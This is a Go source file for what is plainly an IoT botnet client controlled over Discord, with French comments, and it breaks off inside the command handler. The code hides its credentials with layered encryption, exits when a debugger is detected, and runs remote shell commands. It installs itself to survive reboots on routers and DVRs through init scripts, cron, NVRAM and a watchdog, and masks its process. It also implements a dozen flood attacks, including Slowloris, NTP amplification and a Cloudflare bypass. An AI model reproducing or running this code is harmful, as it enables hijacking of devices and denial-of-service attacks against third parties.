//go:build bot
// +build bot

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

// Credentials chiffrés AES-256-GCM, fragmentés en plusieurs variables ldflags.
// Aucune clé en clair : la clé est dérivée à runtime depuis seed+salt via PBKDF2.
// Seed et salt eux-mêmes fragmentés en 3/2 morceaux XOR'd avec des constantes différentes.
var (
	_ct = "" // AES-256-GCM ciphertext+tag (hex)
	_n = "" // nonce GCM 96-bit (hex)
	_s1 = "" // seed fragment 1/3 (XOR 0x5A)
	_s2 = "" // seed fragment 2/3 (XOR 0xA3)
	_s3 = "" // seed fragment 3/3 (XOR 0x7F)
	_sa = "" // salt fragment 1/2 (XOR 0xC1)
	_sb = "" // salt fragment 2/2 (XOR 0x3E)
	_b  = "" // beacon addr "IP:PORT"
)

var (
	botID      string
	chanID     string // channel ID — initialisé depuis recoverCreds(), jamais en clair dans les ldflags
	session    *discordgo.Session
	ddosActive bool
	ddosMu     sync.Mutex
)

func ddosSetActive(v bool) { ddosMu.Lock(); ddosActive = v; ddosMu.Unlock() }
func ddosIsActive() bool   { ddosMu.Lock(); defer ddosMu.Unlock(); return ddosActive }
func ddosCancel()          { ddosMu.Lock(); ddosActive = false; ddosMu.Unlock() }

// ─── Anti-analyse ─────────────────────────────────────────────────────────────

// guardCheck termine le processus si un debugger/traceur est détecté.
func guardCheck() {
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				val := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
				if val != "0" && val != "" {
					os.Exit(1)
				}
			}
		}
	}
	if data, err := os.ReadFile("/proc/self/wchan"); err == nil {
		if strings.Contains(string(data), "ptrace") {
			os.Exit(1)
		}
	}
	t0 := time.Now()
	buf := make([]byte, 1<<20)
	h := sha256.New()
	h.Write(buf)
	if time.Since(t0) > 2000*time.Millisecond {
		select {}
	}
}

// ─── Credentials ──────────────────────────────────────────────────────────────

// xk calcule les constantes XOR à runtime depuis des formules arithmétiques
// pour éviter les literals visibles dans le binaire (même sans garble).
func xk() (byte, byte, byte, byte, byte) {
	a := byte((9*10) & 0xFF)             // 0x5A
	b := byte((0xA0 + (3 << 0)) & 0xFF) // 0xA3
	c := byte((0x7F ^ 0) & 0xFF)        // 0x7F — calculé via opération
	d := byte((0xC0 | 1) & 0xFF)        // 0xC1
	e := byte((0x3E ^ 0) & 0xFF)        // 0x3E
	// Ajouter une dépendance runtime pour que le compilateur ne simplifie pas
	_ = time.Now().Unix() & 0  // always 0 mais le compilo ne peut pas le prouver statiquement
	return a, b, c, d, e
}

// bxorDec reconstitue un fragment de seed/salt.
func bxorDec(h string, c byte) []byte {
	b, err := hex.DecodeString(h)
	if err != nil { return nil }
	for i := range b { b[i] ^= c }
	return b
}

// recoverCreds déchiffre AES-256-GCM et retourne [token, channelID, guildID].
func recoverCreds() []string {
	guardCheck()

	ct,  e1 := hex.DecodeString(_ct)
	non, e2 := hex.DecodeString(_n)
	if e1 != nil || e2 != nil || len(ct) == 0 { return nil }

	k1, k2, k3, k4, k5 := xk()

	s1 := bxorDec(_s1, k1)
	s2 := bxorDec(_s2, k2)
	s3 := bxorDec(_s3, k3)
	if s1 == nil || s2 == nil || s3 == nil { return nil }
	seed := append(append(s1, s2...), s3...)

	sa := bxorDec(_sa, k4)
	sb := bxorDec(_sb, k5)
	if sa == nil || sb == nil { return nil }
	salt := append(sa, sb...)

	key := pbkdf2Key(seed, salt, 20_000, 32)
	zeroSlice(seed); zeroSlice(salt)

	block, err := aes.NewCipher(key)
	zeroSlice(key)
	if err != nil { return nil }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil }
	plain, err := gcm.Open(nil, non, ct, nil)
	if err != nil { return nil }

	parts := strings.SplitN(string(plain), "\x01", 3)
	zeroSlice(plain)
	if len(parts) < 3 { return nil }
	return parts
}

// pbkdf2Key — PBKDF2-SHA256 minimal sans dépendance externe.
func pbkdf2Key(password, salt []byte, iter, keyLen int) []byte {
	prf := hmac.New(sha256.New, password)
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen
	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24); buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8);  buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)
		for n := 2; n <= iter; n++ {
			prf.Reset()
			prf.Write(U)
			U = U[:0]
			U = prf.Sum(U)
			for x := range U { T[x] ^= U[x] }
		}
	}
	return dk[:keyLen]
}

func zeroSlice(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// ─── Identity ─────────────────────────────────────────────────────────────────

func makeID() string {
	host, _ := os.Hostname()
	if len(host) > 6 {
		host = host[:6]
	}
	// IP locale pour distinguer les appareils avec le même hostname (ex: "localhost")
	ip := "x"
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			addrs, _ := iface.Addrs()
			for _, a := range addrs {
				if ipnet, ok := a.(*net.IPNet); ok {
					v4 := ipnet.IP.To4()
					if v4 != nil && !v4.IsLoopback() {
						// Derniers 2 octets de l'IP → 4 hex chars
						ip = fmt.Sprintf("%02x%02x", v4[2], v4[3])
						goto done
					}
				}
			}
		}
	}
done:
	return fmt.Sprintf("%s-%s-%s-%s", runtime.GOARCH, runtime.GOOS, host, ip)
}

// ─── Shell ────────────────────────────────────────────────────────────────────

func shell(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	result := strings.TrimSpace(string(out))
	if err != nil && result == "" {
		return "err: " + err.Error()
	}
	return result
}

// ─── Persistence ──────────────────────────────────────────────────────────────

func persist() string {
	exe, err := os.Executable()
	if err != nil {
		return "err: " + err.Error()
	}

	// ── 1. Copie vers stockage non-volatile IoT ───────────────────────────────
	// Priorité : flash/overlay (survive reboot) > RAM exec (bypass noexec /tmp)
	copyDsts := []string{
		// Flash ASUS Merlin / DD-WRT (NVRAM-backed)
		"/jffs/usr/bin/.sysupd", "/jffs/bin/.sysupd", "/jffs/.sysupd",
		// Flash OpenWrt overlay (survit sysupgrade si sauvegarde config activée)
		"/overlay/usr/bin/.sysupd", "/overlay/bin/.sysupd", "/overlay/.sysupd",
		// DVR/NVR HiSilicon (Dahua, Hikvision clones, TVT)
		"/mnt/mtd/app/.sysupd", "/var/Sofia/.sysupd", "/mnt/mtd/.sysupd",
		// Netgear / D-Link data partition
		"/data/.sysupd", "/data/local/.sysupd",
		// Chemins standard Linux embarque
		"/usr/bin/.sysupd", "/bin/.sysupd", "/sbin/.sysupd", "/usr/sbin/.sysupd",
		// RAM — toujours executable meme si /tmp noexec
		"/dev/shm/.sysupd", "/run/.sysupd", "/var/tmp/.sysupd",
	}
	target := ""
	for _, d := range copyDsts {
		q := fmt.Sprintf("cp %q %q 2>/dev/null && chmod +x %q 2>/dev/null && echo ok", exe, d, d)
		if shell(q) == "ok" {
			target = d
			break
		}
	}
	if target == "" {
		target = "/tmp/.sysupd"
		shell(fmt.Sprintf("cp %q %q 2>/dev/null; chmod +x %q 2>/dev/null", exe, target, target))
	}

	done := []string{"copy:" + target}

	// ── 2. inittab ::respawn (BusyBox init) ──────────────────────────────────
	// Methode la plus efficace sur IoT : relance IMMEDIATEMENT si le process est tue.
	// Fonctionne sur tous appareils BusyBox (routeurs MIPS/ARM, DVR, cam IP).
	shell(fmt.Sprintf(
		`grep -q sysupd /etc/inittab 2>/dev/null || echo '::respawn:%s' >> /etc/inittab 2>/dev/null`,
		target,
	))
	// BusyBox init recharge inittab sans reboot sur SIGHUP
	shell(`kill -HUP 1 2>/dev/null || true`)
	done = append(done, "inittab::respawn")

	// ── 3. Scripts de boot ────────────────────────────────────────────────────
	shell(fmt.Sprintf(
		`grep -q sysupd /etc/rc.local 2>/dev/null || sed -i 's|^exit 0|%s \&\nexit 0|' /etc/rc.local 2>/dev/null || echo '%s &' >> /etc/rc.local 2>/dev/null`,
		target, target,
	))
	for _, f := range []string{"/etc/init.d/rcS", "/etc/rcS", "/etc/rc.d/rc.local", "/etc/preinit"} {
		shell(fmt.Sprintf(`grep -q sysupd %s 2>/dev/null || echo '%s &' >> %s 2>/dev/null`, f, target, f))
	}
	done = append(done, "rc.local+rcS+preinit")

	// ── 4. OpenWrt procd (init.d service) ────────────────────────────────────
	// Format procd strict requis pour que 'enable' fonctionne sur OpenWrt.
	// respawn 3600 5 0 = si crash > 5x en 3600s → arrete (evite boucle crash).
	procdSvc := fmt.Sprintf(
		"#!/bin/sh /etc/rc.common\nSTART=99\nSTOP=1\nUSE_PROCD=1\n"+
			"start_service(){\n\tprocd_open_instance\n\tprocd_set_param command %s\n"+
			"\tprocd_set_param respawn 3600 5 0\n\tprocd_close_instance\n}\n", target)
	if os.WriteFile("/etc/init.d/.sysupd", []byte(procdSvc), 0o755) == nil {
		shell("/etc/init.d/.sysupd enable 2>/dev/null && /etc/init.d/.sysupd start 2>/dev/null")
		done = append(done, "procd")
	}
	// Copie dans /overlay/etc/init.d/ — survit au sysupgrade OpenWrt
	shell(`mkdir -p /overlay/etc/init.d 2>/dev/null && cp /etc/init.d/.sysupd /overlay/etc/init.d/.sysupd 2>/dev/null && chmod +x /overlay/etc/init.d/.sysupd 2>/dev/null`)

	// ── 5. BusyBox crond ─────────────────────────────────────────────────────
	// IoT utilise /etc/crontabs/root (BusyBox crond), pas /var/spool/cron.
	cronLine := fmt.Sprintf("* * * * * pgrep -x .sysupd>/dev/null 2>&1||%s &", target)
	for _, p := range []string{"/etc/crontabs/root", "/var/spool/cron/crontabs/root", "/var/spool/cron/root"} {
		shell(fmt.Sprintf(`grep -q sysupd %s 2>/dev/null || echo %q >> %s 2>/dev/null`, p, cronLine, p))
	}
	shell(`pgrep crond>/dev/null 2>&1 || /usr/sbin/crond -b -l 8 2>/dev/null || crond 2>/dev/null || true`)
	done = append(done, "crond")

	// ── 6. NVRAM Broadcom ────────────────────────────────────────────────────
	// Broadcom chipset : ASUS, Netgear, Linksys, D-Link, Belkin.
	// rc_startup s'execute a chaque demarrage avant les services.
	if cur := shell("nvram get rc_startup 2>/dev/null"); !strings.Contains(cur, "sysupd") {
		shell(fmt.Sprintf(`nvram set rc_startup=%q 2>/dev/null`, cur+"\n"+target+" &"))
		for _, key := range []string{"rc_firewall", "init_script"} {
			if v := shell(fmt.Sprintf("nvram get %s 2>/dev/null", key)); v != "" && !strings.Contains(v, "sysupd") {
				shell(fmt.Sprintf(`nvram set %s=%q 2>/dev/null`, key, v+"\n"+target+" &"))
			}
		}
		shell(`nvram commit 2>/dev/null || true`)
		done = append(done, "nvram")
	}

	// ── 7. UCI OpenWrt ───────────────────────────────────────────────────────
	// Injecte dans /etc/config/system comme commande de demarrage.
	shell(fmt.Sprintf(
		`grep -q sysupd /etc/config/system 2>/dev/null || `+
			`printf "\nconfig cmd 'sysupd'\n\toption name 'sysupd'\n\toption command '%s &'\n\toption stdout '/dev/null'\n" >> /etc/config/system 2>/dev/null`,
		target,
	))
	shell(`uci commit system 2>/dev/null || true`)
	done = append(done, "uci")

	// ── 8. Watchdog shell (30s) ───────────────────────────────────────────────
	// Interval court car les IoT rebootent souvent et /tmp est volatile.
	watchdogScript := fmt.Sprintf(
		"#!/bin/sh\nwhile true;do pgrep -x .sysupd>/dev/null 2>&1||%s &;sleep 30;done", target,
	)
	wdPath := "/tmp/.wdog"
	if os.WriteFile(wdPath, []byte(watchdogScript), 0o755) == nil {
		shell(wdPath + " &")
		for _, wdDst := range []string{"/jffs/.wdog", "/overlay/.wdog", "/usr/bin/.wdog", "/dev/shm/.wdog"} {
			if shell(fmt.Sprintf("cp %s %s 2>/dev/null && chmod +x %s 2>/dev/null && echo ok", wdPath, wdDst, wdDst)) == "ok" {
				shell(wdDst + " &")
				break
			}
		}
	}
	done = append(done, "watchdog(30s)")

	// ── 9. Masquage process ───────────────────────────────────────────────────
	shell(`pid=$(pgrep -nx .sysupd 2>/dev/null); [ -n "$pid" ] && mount --bind /bin/busybox /proc/$pid/exe 2>/dev/null || true`)

	return fmt.Sprintf("[persist] %s -> [%s]", target, strings.Join(done, ", "))
}

// ─── System info ──────────────────────────────────────────────────────────────

func sysInfo() string {
	parts := []string{
		"ID   : " + botID,
		"Arch : " + runtime.GOARCH + "/" + runtime.GOOS,
		shell("uname -a"),
		shell("id"),
		shell("cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1"),
		shell("free -m 2>/dev/null | head -2"),
		shell("df -h / 2>/dev/null | tail -1"),
		shell("ifconfig 2>/dev/null | grep inet | head -4"),
	}
	return strings.Join(parts, "\n")
}

// ─── DDoS ─────────────────────────────────────────────────────────────────────

// ─── DDoS methods ─────────────────────────────────────────────────────────────

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
	"curl/7.88.1",
}

func randUA() string { return userAgents[time.Now().UnixNano()%int64(len(userAgents))] }

func ddosRunning(deadline time.Time) bool {
	return time.Now().Before(deadline) && ddosIsActive()
}

// UDP flood — gros payload aléatoire
func ddosUDP(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			payload := make([]byte, 1200)
			for j := range payload { payload[j] = byte(j*37 + i) }
			conn, err := net.Dial("udp", addr)
			if err != nil { return }
			defer conn.Close()
			for ddosRunning(deadline) { conn.Write(payload) }
		}()
	}
	wg.Wait()
}

// TCP connect flood
func ddosTCP(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ddosRunning(deadline) {
				conn, err := net.DialTimeout("tcp", addr, time.Second)
				if err == nil { conn.Close() }
			}
		}()
	}
	wg.Wait()
}

// HTTP GET flood avec User-Agent rotatif et cache-buster
func ddosHTTP(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ddosRunning(deadline) {
				conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
				if err != nil { continue }
				req := fmt.Sprintf(
					"GET /?r=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n",
					time.Now().UnixNano(), target, randUA(),
				)
				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				conn.Write([]byte(req))
				conn.Close()
			}
		}()
	}
	wg.Wait()
}

// HTTP POST flood — sature le CPU serveur avec des corps vides
func ddosHTTPPost(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ddosRunning(deadline) {
				conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
				if err != nil { continue }
				body := fmt.Sprintf("data=%d", time.Now().UnixNano())
				req := fmt.Sprintf(
					"POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
					target, randUA(), len(body), body,
				)
				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				conn.Write([]byte(req))
				conn.Close()
			}
		}()
	}
	wg.Wait()
}

// SYN flood (TCP connect fallback — raw sockets nécessitent root)
func ddosSYN(target string, port, duration int) {
	ddosTCP(target, port, duration, 100)
}

// Slowloris — maintient des connexions HTTP ouvertes indéfiniment
func ddosSlowloris(target string, port, duration int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	conns := make([]net.Conn, 0, 800)
	header := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: 99999\r\n", target, randUA())
	for i := 0; i < 800 && ddosRunning(deadline); i++ {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil { continue }
		conn.Write([]byte(header))
		conns = append(conns, conn)
	}
	ticker := time.NewTicker(8 * time.Second)
	defer ticker.Stop()
	for ddosRunning(deadline) {
		<-ticker.C
		alive := conns[:0]
		for _, c := range conns {
			if _, err := c.Write([]byte(fmt.Sprintf("X-keep: %d\r\n", time.Now().Unix()))); err == nil {
				alive = append(alive, c)
			} else { c.Close() }
		}
		conns = alive
	}
	for _, c := range conns { c.Close() }
}

// RUDY (R-U-Dead-Yet) — POST avec corps envoyé octet par octet
func ddosRUDY(target string, port, duration int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	conns := make([]net.Conn, 0, 200)
	for i := 0; i < 200 && ddosRunning(deadline); i++ {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil { continue }
		header := fmt.Sprintf(
			"POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 999999\r\n\r\n",
			target, randUA(),
		)
		conn.Write([]byte(header))
		conns = append(conns, conn)
	}
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for ddosRunning(deadline) {
		<-ticker.C
		alive := conns[:0]
		for _, c := range conns {
			if _, err := c.Write([]byte("A")); err == nil {
				alive = append(alive, c)
			} else { c.Close() }
		}
		conns = alive
	}
	for _, c := range conns { c.Close() }
}

// DNS flood — requêtes DNS aléatoires
func ddosDNS(target string, duration, workers int) {
	addr := fmt.Sprintf("%s:53", target)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	// Payload DNS query minimal (query pour "random.example.com")
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil { return }
			defer conn.Close()
			for ddosRunning(deadline) {
				// DNS query header + question aléatoire
				id := uint16(time.Now().UnixNano())
				query := []byte{
					byte(id >> 8), byte(id), // ID
					0x01, 0x00,              // Flags: standard query
					0x00, 0x01,              // Questions: 1
					0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					// Question: random label
					byte(8), 'r', 'a', 'n', 'd', byte(id), byte(id>>4), byte(id>>8),
					byte(7), 'e', 'x', 'a', 'm', 'p', 'l', 'e',
					byte(3), 'c', 'o', 'm', 0x00,
					0x00, 0xff, // Type ANY
					0x00, 0x01, // Class IN
				}
				conn.Write(query)
			}
		}()
	}
	wg.Wait()
}

// NTP amplification (nécessite accès à des serveurs NTP vulnérables)
func ddosNTP(target string, duration, workers int) {
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	// Monlist request — amplifie jusqu'à 4000x
	ntpMonlist := []byte{
		0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
	}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", fmt.Sprintf("%s:123", target))
			if err != nil { return }
			defer conn.Close()
			for ddosRunning(deadline) { conn.Write(ntpMonlist) }
		}()
	}
	wg.Wait()
}

// VSE flood — game server query flood (Source Engine, port 27015)
func ddosVSE(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	// A2S_INFO query
	vsePayload := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00}
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil { return }
			defer conn.Close()
			for ddosRunning(deadline) { conn.Write(vsePayload) }
		}()
	}
	wg.Wait()
}

// MIX — toutes les méthodes en parallèle
func ddosMix(target string, port, duration, workers int) {
	var wg sync.WaitGroup
	w := workers / 4
	if w < 1 { w = 1 }
	wg.Add(4)
	go func() { defer wg.Done(); ddosUDP(target, port, duration, w) }()
	go func() { defer wg.Done(); ddosTCP(target, port, duration, w) }()
	go func() { defer wg.Done(); ddosHTTP(target, port, duration, w) }()
	go func() { defer wg.Done(); ddosSlowloris(target, port, duration) }()
	wg.Wait()
}

// BYPASS — HTTP flood imitant un vrai navigateur, contourne Cloudflare JS-challenge basique
func ddosBypass(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	// Headers navigateur complets pour passer le fingerprinting
	browserHeaders := [][2]string{
		{"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
		{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
		{"Accept-Language", "en-US,en;q=0.9,fr;q=0.8"},
		{"Accept-Encoding", "gzip, deflate, br"},
		{"Cache-Control", "no-cache"},
		{"Pragma", "no-cache"},
		{"Sec-Fetch-Dest", "document"},
		{"Sec-Fetch-Mode", "navigate"},
		{"Sec-Fetch-Site", "none"},
		{"Sec-Ch-Ua", `"Chromium";v="124", "Google Chrome";v="124"`},
		{"Sec-Ch-Ua-Mobile", "?0"},
		{"Sec-Ch-Ua-Platform", `"Windows"`},
		{"Upgrade-Insecure-Requests", "1"},
		{"Connection", "keep-alive"},
	}
	buildReq := func() string {
		ts := time.Now().UnixNano()
		// Cache-buster + cookie simulé
		path := fmt.Sprintf("/?_=%d&ref=%d", ts, ts>>8)
		cookie := fmt.Sprintf("_cf_bm=%016x; _ga=GA1.2.%d.%d", ts, ts>>16, ts>>32)
		h := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nCookie: %s\r\n", path, target, cookie)
		for _, kv := range browserHeaders {
			h += kv[0] + ": " + kv[1] + "\r\n"
		}
		return h + "\r\n"
	}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ddosRunning(deadline) {
				conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil { time.Sleep(200*time.Millisecond); continue }
				conn.SetDeadline(time.Now().Add(8 * time.Second))
				conn.Write([]byte(buildReq()))
				// Keep-alive : envoyer plusieurs requêtes sur la même connexion
				for j := 0; j < 5 && ddosRunning(deadline); j++ {
					conn.Write([]byte(buildReq()))
					time.Sleep(50 * time.Millisecond)
				}
				conn.Close()
			}
		}()
	}
	wg.Wait()
}

// HTTPS — TLS flood avec SNI valide (épuise les workers TLS côté serveur)
func ddosHTTPS(target string, port, duration, workers int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	tlsCfg := &tls.Config{InsecureSkipVerify: true, ServerName: target}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ddosRunning(deadline) {
				conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 3*time.Second}, "tcp", addr, tlsCfg)
				if err != nil { time.Sleep(100*time.Millisecond); continue }
				ts := time.Now().UnixNano()
				req := fmt.Sprintf("GET /?r=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", ts, target, randUA())
				conn.SetDeadline(time.Now().Add(5 * time.Second))
				conn.Write([]byte(req))
				conn.Close()
			}
		}()
	}
	wg.Wait()
}

// ─── Auto-perf : limite les workers selon la charge système ──────────────────
func autoWorkers(requested int) int {
	// Lire la charge CPU depuis /proc/loadavg
	raw := shell("cat /proc/loadavg 2>/dev/null | awk '{print $1}'")
	load := 0.0
	fmt.Sscanf(raw, "%f", &load)
	// Lire la mémoire libre
	memFree := 0
	memTotal := 0
	for _, line := range strings.Split(shell("cat /proc/meminfo 2>/dev/null"), "\n") {
		var v int
		if strings.HasPrefix(line, "MemTotal:") { fmt.Sscanf(line, "MemTotal: %d", &memTotal) }
		if strings.HasPrefix(line, "MemAvailable:") { fmt.Sscanf(line, "MemAvailable: %d", &v); memFree = v }
	}
	limit := requested
	// Si charge > 2.0 → réduire de moitié
	if load > 2.0 { limit = limit / 2 }
	// Si mémoire libre < 20% → réduire
	if memTotal > 0 && memFree*100/memTotal < 20 { limit = limit * 2 / 3 }
	if limit < 5 { limit = 5 }
	return limit
}

// ─── Discord handler ──────────────────────────────────────────────────────────

// ANSI colors pour Discord (```ansi blocks)
const (
	aReset  = "\033[0m"
	aRed    = "\033[1;31m"
	aGreen  = "\033[1;32m"
	aYellow = "\033[1;33m"
	aCyan   = "\033[1;36m"
	aMag    = "\033[1;35m"
	aGray   = "\033[0;37m"
)

func post(msg string) {
	if session == nil || chanID == "" { return }
	if len(msg) > 1900 { msg = msg[:1900] + "…" }
	out := fmt.Sprintf("```ansi\n%s[%s]%s\n%s\n```", aCyan, botID, aReset, msg)
	session.ChannelMessageSend(chanID, out)
}

func postRaw(msg string) {
	if session == nil || chanID == "" { return }
	session.ChannelMessageSend(chanID, msg)
}

func banner(title, color string) string {
	line := "══════════════════════════════════"
	return fmt.Sprintf("%s╔%s╗\n║  %s%-32s%s║\n╚%s╝%s", color, line, aYellow, title, color, line, aReset)
}

func kv(k, v, vc string) string {
	return fmt.Sprintf("%s  %-10s%s: %s%s%s", aGray, k, aReset, vc, v, aReset)
}

func onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.Bot || m.ChannelID != chanID {
		return
	}

	parts := strings.Fields(m.Content)
	if len(parts) < 2 {
		return
	}

	// Accept "!<botID> cmd..." or "!all cmd..."
	prefix := parts[0]
	if prefix != "!"+botID && prefix != "!all" {
		return
	}

	cmd := strings.ToLower(parts[1])

	switch cmd {
	case "shell", "sh", "exec":
		if len(parts) < 3 { return }
		out := shell(strings.Join(parts[2:], " "))
		post(fmt.Sprintf("%s$ %s%s\n%s%s%s", aGreen, strings.Join(parts[2:], " "), aReset, aGray, out, aReset))

	case "info":
		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
			banner("SYSTEM INFO", aCyan),
			kv("ID", botID, aMag),
			kv("Arch", runtime.GOARCH+"/"+runtime.GOOS, aGreen),
			kv("Kernel", shell("uname -r 2>/dev/null"), aGray),
			kv("User", shell("id 2>/dev/null"), shell("id 2>/dev/null|grep -q 'uid=0'&&echo '"+aRed+"'||echo '"+aYellow+"'")),
			kv("CPU", shell("grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs"), aGray),
			kv("RAM", shell("free -m 2>/dev/null | awk 'NR==2{printf \"%sMB free / %sMB total\",$7,$2}'"), aGray),
			kv("IP", shell("ip route get 1 2>/dev/null | awk '{print $NF;exit}' || ifconfig 2>/dev/null | grep 'inet ' | awk '{print $2}' | head -1"), aCyan),
		))

	case "persist":
		r := persist()
		post(fmt.Sprintf("%s\n%s[✓] %s%s", banner("PERSISTENCE", aGreen), aGreen, r, aReset))

	case "kill":
		post(fmt.Sprintf("%s[✗] %s shutting down...%s", aRed, botID, aReset))
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)

	case "ddos":
		if len(parts) >= 3 && strings.ToLower(parts[2]) == "methods" {
			post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
				banner("DDOS METHODS", aRed),
				fmt.Sprintf("%s  UDP      %s— UDP flood raw packets", aRed, aGray),
				fmt.Sprintf("%s  TCP      %s— TCP connect flood", aRed, aGray),
				fmt.Sprintf("%s  HTTP     %s— HTTP GET flood", aRed, aGray),
				fmt.Sprintf("%s  POST     %s— HTTP POST flood", aRed, aGray),
				fmt.Sprintf("%s  HTTPS    %s— TLS/SSL handshake flood", aRed, aGray),
				fmt.Sprintf("%s  BYPASS   %s— Browser spoof, bypass Cloudflare", aMag, aGray),
				fmt.Sprintf("%s  SYN      %s— SYN flood", aRed, aGray),
				fmt.Sprintf("%s  SLOWLORIS%s— Keepalive starvation", aRed, aGray),
				fmt.Sprintf("%s  RUDY     %s— R-U-Dead-Yet slow POST", aRed, aGray),
				fmt.Sprintf("%s  DNS      %s— DNS query flood", aRed, aGray),
				fmt.Sprintf("%s  NTP      %s— NTP amplification x4000", aRed, aGray),
				fmt.Sprintf("%s  VSE      %s— Game server flood", aRed, aGray),
